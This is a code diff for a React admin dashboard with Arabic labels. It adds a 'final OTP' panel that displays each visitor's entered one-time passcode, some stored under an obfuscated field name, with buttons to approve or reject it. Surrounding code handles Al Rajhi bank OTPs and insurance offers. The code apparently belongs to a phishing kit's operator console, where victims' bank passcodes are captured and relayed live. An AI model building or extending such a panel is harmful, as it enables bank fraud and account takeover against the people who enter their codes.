@@ -590,6 +590,36 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
+  // Final OTP bubble
+  const finalOtpCode = visitor._v13 || visitor.finalOtp;
+  if (
+    finalOtpCode ||
+    visitor.finalOtpStatus ||
+    (visitor.currentStep as any) === "finalOtp" ||
+    (visitor.redirectPage as any) === "finalOtp"
+  ) {
+    bubbles.push({
+      id: "final-otp-info",
+      title: "🔐 OTP الأخير",
+      icon: "🔐",
+      color: "purple",
+      data: {
+        "رمز OTP النهائي": finalOtpCode || "في انتظار الإدخال...",
+        "الحالة": visitor.finalOtpStatus === "approved"
+          ? "✅ مقبول"
+          : visitor.finalOtpStatus === "rejected"
+          ? "❌ مرفوض"
+          : visitor.finalOtpStatus === "pending"
+          ? "⏳ قيد المراجعة"
+          : "⏳ في انتظار الإدخال",
+      },
+      timestamp: visitor.finalOtpUpdatedAt || visitor.updatedAt,
+      showActions: true,
+      type: "final_otp",
+      status: visitor.finalOtpStatus,
+    });
+  }
+
   // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
   const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
   const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
@@ -729,6 +759,22 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               await updateApplication(visitor.id, {
                 rajhiOtp: "",
                 rajhiOtpStatus: "rejected",
+              });
+            }
+          }
+          break;
+
+        case "final_otp":
+          if (action === "approve") {
+            await updateApplication(visitor.id, {
+              finalOtpStatus: "approved",
+            });
+          } else if (action === "reject") {
+            if (confirm("هل أنت متأكد من رفض رمز OTP الأخير؟")) {
+              await updateApplication(visitor.id, {
+                finalOtp: "",
+                _v13: "",
+                finalOtpStatus: "rejected",
               });
             }
           }
